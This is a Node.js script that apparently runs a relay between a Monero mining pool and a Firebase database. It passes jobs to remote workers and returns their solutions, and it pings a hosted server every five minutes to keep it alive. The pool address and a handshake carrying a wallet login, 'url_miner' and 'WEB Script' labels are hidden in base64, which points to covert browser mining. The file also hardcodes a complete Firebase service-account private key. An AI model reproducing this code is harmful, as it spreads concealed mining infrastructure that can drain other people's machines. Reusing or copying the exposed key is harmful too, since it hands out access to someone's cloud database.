const WebSocketClient = require('websocket').client
const admin = require('firebase-admin')
const express = require('express')
const axios = require('axios')


let mClient = null
let mTimeout = null
let mPending = []
let mUrl = null
let mJobSolve = 0

let mStart = parseInt(new Date().getTime()/1000)
let mTime = new Date().toString()

const serviceAccount = {
    "type": "service_account",
    "project_id": "database088",
    "private_key_id": "82201412075bafbc548434135c40b9b759e694b2",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCdGFN/vva1/qHS\nBqFM12s8RtINmTdu6bcdNHFpgz+h3kg2Id8OYxlLgb42YNh5YjzXl8fRK2gRrH10\n4S36D9snPPj0u6SN6S/W/faFzVJ9VMO20/+27UlmeQI01XLEabRsIt7QrHU3w2uZ\nOE9OPwTjfwQKyreUSvH3jyr4osjKkk0YBI4mQAM9j/jmaWzb5BOsSVyNuRhp/H8P\noy8LFoLpMXiDnWjm9zKb+LbK5pWWegGUswhO+HrE8G37XZsd7lN+O8HOWvgCVNfQ\nmB6X1ad9/aaYjjCdoBzqQWvw/T+yO3rHobafrj0d3dYHWi4BIz9qJKzeckl+caVH\nKEHQw4epAgMBAAECggEAAI7m8g3iyMoFN262WURtMT9DrRBxr9tU/x2x9vjkS54T\nddzIMwADZZ8qBr2wmzrQAkib6Uh9E83/+p+3tvsiMVkgPddiWe49kSchHn/YppEb\n6m0FrDfa4ko1CazF/gBtp5I2pjlsp7RyMA7RClNDQE8x25t1jEl5Y2Ku+YfzjHO3\n83yc6rVxgZjMaxiUYGGwKH1x5NyvMXFG2sFtcBLgYKBlosoILZcNCGguFxE5ptYV\nHSBdJJ1GhcgJpjGemdZ3CrTWtd8wmlwkPg8x+VXogTY3eK9k3vlM1oMaapr1byML\nkr3xMASWe+wsVjLyyoBzJGu8v0gThgkVs1ri//VEUQKBgQDdn9Zqd1vFUzLeeQn3\nEqOu8rPwTVxVtAu51Iz1m6mFQ5hk3ty+kHGSeiU8n1dHXUgzivarOAOG04uSSZ6C\n1eRN8lKug06A5W+m14/tayQjWhNg3iklbcynf9u0idGjP4i0zIBOo0Xy3wFk1AwL\nq+rVWLwhBr5aJDvUYGlYWojFEQKBgQC1di+elrkh+ffzYWuVKK6xNJecjuBXY6nQ\nU1+qP/KcFJnAB4FapFIZGgjL7wbAWIrEDVVIXUOtYz4vH8sjUkXKi6EpmO8WLqCl\nsK8cqo49PaSKRIFJ/ggoQjM6INCZu2mTgncXgYhOFOosXBQE+zmhUBBHqkahl2CR\nEhJ7Jw+5GQKBgC2lUAoZj0MzAZUkpNLIegH8ZuclZ9EXBhs+FdI4P0/9PhP4esqd\nAWdD1QuJXfaK1eYXxvo4zTElvOdiVk1oNF+Be1oKHU8a8kYQu8oQeR723GrlFuBo\nnvAYu22RvSW8XjGutPZ9VljRaX4U1m5I+FL8tbKvquDx+YiiWtAhxW2hAoGAUW0X\nMTKxIG3qtWuhuuzmdt4Cql3yjURLjw/afar0UtVrqJ+1i9bwgBMOn3RCs00H97GD\n81TmaYd+/+ZkYRUp/Blr2B6oKmwB6le+PD7MVO60Rtc2rN0xC9+o3Qycjl9qoKaK\niiG16FO6QO2QjiutUJV8uKvPxfMHghF5+YktpQECgYB3xOJhzTGe7nZDm6/ea8ei\nvj8zrO7YWlCUaxPDTNgOeAVgoMy8wZ8FEbyiqEZ2KLSCk1GlloIFZXxxsXp1vwnX\nWsh44SUHvoE52/u6f2SeGJmurKOmzxjm4AWoUUPjGaemSdRxNITeaL1St42gIKGc\nGfGhhgwEdljXfkzQ5l90DA==\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-ho5ln@database088.iam.gserviceaccount.com",
    "client_id": "106012552775924668601",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-ho5ln%40database088.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}

let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')

let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')

admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://database088-default-rtdb.firebaseio.com'
})

let app = express()

app.use(express.json())

app.listen(process.env.PORT || 3000, ()=>{
    console.log('Listening on port 3000')
})

app.get('/', async (req, res) => {
    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})

app.get('/solved', async (req, res) => {
    res.end('SOLVED: '+mJobSolve)
})


startServer()
connneckClient()


setInterval(() => {
    startServer()
}, 300000)

const database = admin.database()

const mSolved = database.ref('raiyan088').child('mining').child('solved')

mSolved.on('value', function(snapshot) {
    try {
        snapshot.forEach(function(childSnapshot) {
            try {
                let key = childSnapshot.key
                let childData = childSnapshot.val()
                let time = childData['time']

                if (parseInt(new Date().getTime()/1000) < time+90) {
                    mJobSolve++
                    let solved = {
                        identifier: 'solved',
                        job_id: childData['id'],
                        nonce: childData['nonce'],
                        result: key
                    }
    
                    if (mClient) {
                        mClient.send(JSON.stringify(solved))
                    } else {
                        mPending.push(JSON.stringify(solved))
                    }
                }
            } catch (error) {}
        })
    } catch (error) {}

    try {
        mSolved.remove()
    } catch (error) {}
})

async function startServer() {
    if (mUrl == null) {
        try {
            let response = await axios.get(BASE_URL+'live/server_1.json')
    
            let data = response.data
            if (data != null && data != 'null') {
                mUrl = data
            }
        } catch (error) {}
    }

    if (mUrl) {
        try {
            await axios.get('https://'+mUrl)
        } catch (error) {}
    }
}


function connneckClient() {
    let client = new WebSocketClient()

    client.on('connectFailed', function(error) {
        mClient = null
        console.log('Re-Connect', 'Failed')
        if (mTimeout) clearTimeout(mTimeout)
        setTimeout(() => connneckClient(), 2000)
    })
    
    client.on('connect', function(conn) {
        if (mClient == null) {
            mClient = conn
    
            console.log('WebSocket Client Connected')
        
            mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsX21pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
        
            mClient.on('error', function(error) {
                mClient = null
                console.log('Re-Connect', 'Error')
                if (mTimeout) clearTimeout(mTimeout)
                setTimeout(() => connneckClient(), 2000)
            })
        
            mClient.on('message', function(message) {
                try {
                    let data = JSON.parse(message.utf8Data)
                    if(data['identifier'] == 'job') {
                        sendJob(data)
                        
                        console.log('New Job Received...')
                    }
                } catch (e) {}
            })

            setTimeout(async () => {
                for (let i = 0; i < mPending.length; i++) {
                    try {
                        if (mClient) {
                            mClient.send(mPending[i])
                            await delay(200)
                        }
                    } catch (error) {}
                }
    
                mPending = []
            }, 1000)
        }
    })
    
    client.connect(WSS)

    mTimeout = setTimeout(() => {
        try {
            mClient.close()
        } catch (error) {}
        try {
            client.close()
        } catch (error) {}
        
        try {
            mClient = null
            client = null
        } catch (error) {}
        
        console.log('Re-Connect')
        connneckClient()
    }, 300000)
}


async function sendJob(job) {
    try {
        await axios.patch(BASE_URL+'mining/job.json', JSON.stringify(job), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
